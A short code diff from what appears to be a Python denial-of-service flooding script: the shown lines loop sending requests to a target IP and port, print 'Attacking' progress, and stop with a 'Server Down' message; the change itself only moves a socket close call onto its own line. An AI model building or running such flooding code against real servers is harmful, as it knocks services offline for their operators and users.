@@ -92,7 +92,8 @@ def start():
                 s.sendall(str.encode(main_req))
             xx += random.randint(0, pack)
             print("[+] Attacking {0}:{1} | Sent: {2}".format(ip, port, xx))
-        except Exception as e:            s.close()
+        except Exception as e:
+            s.close()
             print(f'[+] Server Down: {e}')
             break  # Ngắt vòng lặp khi có lỗi
 
